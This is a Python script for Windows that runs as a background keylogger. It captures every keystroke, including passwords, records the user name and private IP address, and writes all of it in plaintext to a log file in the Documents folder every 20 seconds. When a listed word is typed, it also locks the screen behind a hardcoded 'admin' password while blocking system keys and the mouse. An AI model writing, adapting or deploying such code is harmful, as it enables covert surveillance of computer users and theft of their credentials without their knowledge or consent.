import os
import time
import socket
import requests
import json
import ctypes
import tkinter as tk
import win32api
import win32con
import win32gui
import threading
import keyboard
from pynput.keyboard import Key, Listener
from pynput.mouse import Controller as MouseController

# Path to the blocked words JSON file
BLOCKED_WORDS_FILE = "blocked_words.json"

# Admin password for unlocking the system
admin_password = "admin"

# Global variable to store window class atom to prevent re-registration
wnd_class_atom = None

# Fetch system details
private_ip = socket.gethostbyname(socket.gethostname())  # Get local IP address
user = os.path.expanduser('~').split('\\')[2]  # Get the current user profile name
datetime = time.ctime(time.time())  # Get current date and time

buffer = ""  # String buffer to store keystrokes
msg = f'[START OF LOGS]\n   *~Date/Time: {datetime}\n   *~User-Profile: {user}\n  *~Private-IP: {private_ip}\n\n'
buffer += msg  # Initial log entry

# Load blocked words from the JSON file
def load_blocked_words():
    """Load blocked words from the JSON file."""
    try:
        with open(BLOCKED_WORDS_FILE, 'r') as file:
            data = json.load(file)
            return data.get("blocked_words", [])
    except Exception as e:
        print(f"[!] Error loading blocked words: {e}")
        return []

# Load the blocked words from the JSON file
blocked_words = load_blocked_words()

key_substitutions = {
    'Key.enter': '[ENTER]\n',
    'Key.backspace': '[BACKSPACE]',
    'Key.space': ' ',
}

def on_press(key):
    """Handles key press events, logs keystrokes, and checks for blocked words."""
    global buffer  # Access the global buffer variable
    try:
        if hasattr(key, 'char') and key.char:  # If the key is a regular character
            buffer += str(key.char)  # Add it to the buffer
        
        elif str(key) == "Key.backspace":  # Handle the backspace key
            buffer = buffer[:-1]  # Remove the last character from the buffer
        
        elif str(key) in key_substitutions:
            buffer += key_substitutions[str(key)]  # Handle special keys
        
        # Check if any blocked word is typed
        for word in blocked_words:
            if word in buffer.lower():
                lock_screen()  # Trigger lock screen if blocked word is detected
                buffer = buffer[:len(word) - 1]
                return

    except Exception as e:
        print(f"[!] Error in on_press: {e}")

def write_file():
    """Appends current buffer data to the log file every minute."""
    global buffer  # Access the global buffer variable
    filepath = os.path.expanduser('~') + '/Documents/'
    filename = "key_logs.txt"
    file_path = os.path.join(filepath, filename)  # Create the file path

    while True:
        with open(file_path, 'a') as fp:  # Open in append mode
            fp.write(buffer)  # Write the current buffer to the file
            buffer = ""  # Reset buffer after writing
        time.sleep(20)  # Wait for 20 seconds before writing again

def lock_screen():
    """Create a fullscreen lock screen that blocks the taskbar with password input."""
    global wnd_class_atom  # Use global variable to store window class atom

    # Block specific keys
    keyboard.block_key('windows')
    keyboard.block_key('ctrl')
    keyboard.block_key('alt')
    keyboard.block_key('space')

    # Disable the mouse by moving the cursor out of the screen
    mouse = MouseController()
    mouse.position = (-100, -100)  # Move mouse out of the screen

    # Block mouse events
    def disable_mouse(hwnd, msg, wparam, lparam):
        return 0

    # Get screen width and height
    user32 = ctypes.windll.user32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)

    # Check if the window class is already registered
    if wnd_class_atom is None:
        # Register the window class if not registered yet
        hInstance = win32api.GetModuleHandle(None)
        className = "LockScreen"

        wndClass = win32gui.WNDCLASS()
        wndClass.hInstance = hInstance
        wndClass.lpszClassName = className
        wndClass.lpfnWndProc = {
            win32con.WM_KEYDOWN: lambda hwnd, msg, wparam, lparam: 0,
            win32con.WM_LBUTTONDOWN: disable_mouse,
            win32con.WM_RBUTTONDOWN: disable_mouse,
            win32con.WM_MBUTTONDOWN: disable_mouse,
            win32con.WM_MOUSEMOVE: disable_mouse
        }  # Disable mouse events
        wndClass.hbrBackground = win32gui.GetStockObject(win32con.BLACK_BRUSH)
        wndClass.style = win32con.CS_VREDRAW | win32con.CS_HREDRAW

        # Register class and store the atom for later use
        wnd_class_atom = win32gui.RegisterClass(wndClass)

    # Create the fullscreen lock window
    hwnd = win32gui.CreateWindowEx(
        win32con.WS_EX_TOPMOST,
        wnd_class_atom,
        "LOCKED",
        win32con.WS_POPUP,
        0, 0, screen_width, screen_height,
        None,
        None,
        win32api.GetModuleHandle(None),
        None,
    )

    # Show the lock screen
    win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
    win32gui.UpdateWindow(hwnd)

    # Function to handle password entry and unlock the screen
    def unlock():
        entered_password = password_entry.get()
        if entered_password == admin_password:
            # Unblock keys after unlocking
            keyboard.unblock_key('windows')
            keyboard.unblock_key('ctrl')
            keyboard.unblock_key('alt')
            keyboard.unblock_key('space')
            
            win32gui.DestroyWindow(hwnd)  # Close the lock screen
            root.destroy()
        else:
            message_label.config(text="Incorrect password. Try again.", fg="red")

    # Create a Tkinter window for password input
    root = tk.Tk()
    root.title("Unlock")
    root.geometry(f"{screen_width}x{screen_height}")
    root.attributes('-fullscreen', True)  # Fullscreen window
    root.attributes('-topmost', True)  # Always on top
    root.configure(bg="black")

    # Centered label for lock message
    lock_message = tk.Label(root, text="System Locked\nEnter Password to Unlock", 
                            fg="white", bg="black", font=("Helvetica", 24))
    lock_message.pack(pady=100)

    # Password input box
    password_entry = tk.Entry(root, show="*", font=("Helvetica", 20), width=30)
    password_entry.pack(pady=20)
    password_entry.focus_set()  # Automatically focus the password entry box

    # Unlock button
    unlock_button = tk.Button(root, text="Unlock", command=unlock, font=("Helvetica", 18), bg="white")
    unlock_button.pack(pady=20)

    # Label for incorrect password message
    message_label = tk.Label(root, text="", fg="white", bg="black", font=("Helvetica", 18))
    message_label.pack()

    root.mainloop()


if __name__ == "__main__":
    # Start the file-writing thread
    threading.Thread(target=write_file, daemon=True).start()

    # Start listening for key presses in the background
    with Listener(on_press=on_press) as listener:
        listener.join()
